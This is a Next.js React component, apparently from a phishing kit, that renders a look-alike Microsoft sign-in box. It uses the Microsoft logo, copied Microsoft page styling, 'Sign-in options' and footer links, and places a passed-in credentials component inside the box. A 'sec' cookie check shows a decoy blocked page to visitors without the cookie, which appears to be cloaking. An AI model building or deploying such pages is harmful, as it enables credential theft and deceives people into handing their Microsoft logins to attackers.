"use client";
import Image from "next/image";
import { getCookie } from "cookies-next";
import { useEffect, useState } from "react";
import Blocked_page from "./block_page";
export default function CredsBox({ curr_component }) {
  // if (typeof document !== "undefined") {
  //   document.body.classList.add(
  //     `bg-[url('/${GlobalConifg.subDir}/background.svg')]`,
  //     "w-full",
  //     "bg-cover"
  //   );
  // }

  const [isRedirecting, setIsRedirecting] = useState(true);

  useEffect(() => {
    const cookie_sec = getCookie("sec");
    if (
      (cookie_sec != null) &
      (process.env.NEXT_PUBLIC_SUB_DIR != "NOSUBDIR")
    ) {
      // router.replace("/news").then(() => {
      setIsRedirecting(false);
      // });
    }
  });

  const pageChanger = () => {
    if (isRedirecting) {
      return <Blocked_page />;
      // return <div>hello</div>;
    } else {
      return (
        <div className="flex flex-col min-h-screen justify-center items-center">
          <div
            style={{
              WebkitTextSizeAdjust: "100%",
              fontWeight: "400",
              fontSize: ".9375rem",
              lineHeight: "1.25rem",
              direction: "ltr",
              color: "#1b1b1b",
              textAlign: "left",
              boxSizing: "border-box",
              position: "relative",
              maxWidth: "440px",
              width: "calc(100% - 40px)",
              padding: "44px",
              marginBottom: "28px",
              backgroundColor: "#fff",
              boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
              minWidth: "320px",
              minHeight: "338px",
              overflow: "hidden",
            }}
          >
            <img
              id="box-logo"
              src={`/Microsoft-logo.png`}
              style={{
                WebkitTextSizeAdjust: "100%",
                fontWeight: "400",
                fontSize: ".9375rem",
                lineHeight: "1.25rem",
                direction: "ltr",
                color: "#1b1b1b",
                textAlign: "left",
                boxSizing: "border-box",
                border: "0",
                verticalAlign: "middle",
                maxWidth: "256px",
                height: "24px",
                marginBottom: "0.6rem",
                position: "relative",
              }}
              alt="something"
            />

            {curr_component}
          </div>

          <div
            id="signIn-options"
            style={{
              display: "none",
              WebkitTextSizeAdjust: "100%",
              fontWeight: "400",
              fontSize: ".9375rem",
              direction: "ltr",
              color: "#1b1b1b",
              textAlign: "left",
              boxSizing: "border-box",
              position: "relative",
              maxWidth: "440px",
              width: "calc(100% - 40px)",
              marginBottom: "28px",
              backgroundColor: "#fff",
              boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
              minWidth: "320px",
              minHeight: "40px",
              overflow: "hidden",
            }}
          >
            <div className="flex flex-row items-center ml-10 my-3">
              <img src={`/signin-options.svg`} className="w-7 mr-4"></img>
              <div
                style={{
                  WebkitTextSizeAdjust: "100%",
                  fontWeight: "400",
                  fontSize: ".9375rem",
                  direction: "ltr",
                  color: "inherit",
                  cursor: "pointer",
                  textAlign: "left",
                  lineHeight: "16px",
                  boxSizing: "border-box",
                  wordWrap: "break-word",
                }}
              >
                Sign-in options
              </div>
            </div>
          </div>

          <div className="absolute bottom-0 right-0 ">
            <div
              style={{
                WebkitTextSizeAdjust: "100%",
                fontWeight: "400",
                direction: "ltr",
                textAlign: "left",
                boxSizing: "border-box",
                backgroundColor: "transparent",
                textDecoration: "none",
                fontSize: "12px",
                lineHeight: "28px",
                whiteSpace: "nowrap",
                display: "inline-block",
                marginLeft: "8px",
                marginRight: "8px",
                color: "#000",
              }}
            >
              Terms of use
            </div>
            <div
              style={{
                WebkitTextSizeAdjust: "100%",
                fontWeight: "400",
                direction: "ltr",
                textAlign: "left",
                boxSizing: "border-box",
                backgroundColor: "transparent",
                textDecoration: "none",
                fontSize: "12px",
                lineHeight: "28px",
                whiteSpace: "nowrap",
                display: "inline-block",
                marginLeft: "8px",
                marginRight: "8px",
                color: "#000",
              }}
            >
              Privacy & cookies
            </div>
            <div
              style={{
                WebkitTextSizeAdjust: "100%",
                direction: "ltr",
                textAlign: "left",
                boxSizing: "border-box",
                backgroundColor: "transparent",
                color: "#000",
                whiteSpace: "nowrap",
                display: "inline-block",
                marginLeft: "8px",
                marginRight: "8px",
                textDecoration: "none",
                letterSpacing: "3px",
                lineHeight: "22px",
                verticalAlign: "top",
                fontSize: "16px",
                fontWeight: "600",
              }}
            >
              ...
            </div>
          </div>
        </div>
      );
    }
  };

  return <div>{pageChanger()}</div>;
}
